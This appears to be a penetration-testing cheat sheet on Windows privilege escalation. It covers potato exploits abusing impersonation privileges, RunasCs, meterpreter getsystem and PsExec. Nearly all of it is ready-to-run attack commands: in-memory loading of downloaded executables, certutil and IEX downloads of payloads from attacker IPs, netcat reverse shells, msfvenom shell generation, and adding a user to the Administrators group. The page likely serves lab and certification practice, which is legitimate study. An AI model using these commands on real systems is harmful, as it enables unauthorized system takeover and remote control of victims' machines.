# Quick win

### Any users with impersonate privileges to _**`NT AUTHORITY\SYSTEM`**_

#### - User privileges and potato exploit

_**JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However,_ [_**PrintSpoofer**_](https://github.com/itm4n/PrintSpoofer)_**,**_ [_**RoguePotato**_](https://github.com/antonioCoco/RoguePotato)_**,**_ [_**SharpEfsPotato**_](https://github.com/bugch3ck/SharpEfsPotato)_**,**_ [_**GodPotato**_](https://github.com/BeichenDream/GodPotato) _can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This_ [_blog post_](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) _goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works._

{% code overflow="wrap" %}
```bash
>whoami /priv

# Find SeImpersonatePrivilege 

# Use SigmaPoato - Improved God potato 
# https://github.com/tylerdotrar/SigmaPotato
# In memory attack. Find other attacks at github site
Kali> rlwrap nc -nlvp 1236
CMD> powershell
PS> [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://10.10.14.16/privesc/SigmaPotato.exe"))
[SigmaPotato]::Main(@("--revshell","10.10.14.16","1236"))

# Use God potato to rule them all as of 8/27/2023
# https://github.com/BeichenDream/GodPotato
CMD> certutil -urlcache -split -f http://10.10.14.16/nc.exe
Kali> rlwrap nc -nlvp 1235
CMD> GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.16 1235"

# Printspoofer
# https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/ 

CMD> .\PrintSpoofer64.exe -i -c cmd

# Use Local Potato to rule them all - Local Potato or Sweet Potato as pf 12/22/2022

# If you do not want to use Local Potato or Sweet Potato:

#    If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato

#    If the machine is < Windows 10 1809(or 1803) < Windows Server 2019 and/or only x86- Try Juicy Potato

# https://github.com/ivanitlearning/Juicy-Potato-x86 
Kali> msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.183 lport=443 -f exe -o shell.exe
CMD> certutil -urlcache -split -f http://192.168.45.183/j.exe # Juicy Potato
CMD> certutil -urlcache -split -f http://192.168.45.183/shell.exe # reverse shell

Kali> rlwrap nc -nlvp 443
CMD> j.exe  -l 443 -p C:\wamp\bin\apache\Apache2.2.21\shell.exe -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}

```
{% endcode %}

[https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

[Potato section ](../potato.md)in this guide

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" %}

### Normal User to Local Administrator or More Privileges

#### - Add Ourselves to the group - Normal Users to Local Administrator

{% code overflow="wrap" %}
```bash
net localgroup Administrators [username] /add
```
{% endcode %}

#### - RunasCS - Local Administrator with having more privileges (as well as logon as a different user)

{% code overflow="wrap" %}
```bash
# Run if you see a user in Local Administrators group
# https://github.com/antonioCoco/RunasCs/ 
# Try if you can add BypassUac and LogonType options

Kali> rlwrap nc -nlvp 444
PS> IEX (new-Object Net.WebClient).DownloadString('http://10.10.14.35/privesc/Invoke-RunasCs.ps1');Invoke-RunasCs -Username backup -Password 'hjqNspenHcyyAwNqxfJAmFcAtiKThvpotaZpglDs' -BypassUac -LogonType 8 -Command cmd.exe -Remote 10.10.14.35:4444 
```
{% endcode %}

### Local Administrator to System

If you have a Metasploit meterpreter session going, you can run `getsystem`.

{% code overflow="wrap" %}
```bash
# load the ‘priv’ extension

meterpreter > use priv
Loading extension priv...success.
meterpreter >

# getsystem
# local administrator to SYSTEM

meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
{% endcode %}

To escalate from an admin user to full SYSTEM privileges, you can use the PsExec tool from Windows Sysinternals.([https://docs.microsoft.com/enus/sysinternals/downloads/psexec](https://docs.microsoft.com/enus/sysinternals/downloads/psexec)).

```bash
> .\PsExec64.exe -accepteula -i -s cmd.exe
> .\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
```
